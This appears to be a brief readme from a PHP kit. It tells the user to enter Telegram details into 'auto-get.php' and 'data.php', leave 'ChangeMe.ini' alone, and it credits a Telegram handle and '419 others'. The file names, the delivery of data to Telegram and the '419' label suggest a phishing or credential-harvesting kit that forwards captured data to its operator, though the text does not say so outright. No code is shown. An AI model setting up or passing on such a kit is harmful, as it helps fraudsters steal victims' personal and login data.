#### author = Dooz 777 @dooz_7 on telegram
put telegram info in

auto-get.php
data.php

Leave ChangeMe.ini unless u know what you are doing

thanks to Dooz_7 & 419 others on telegram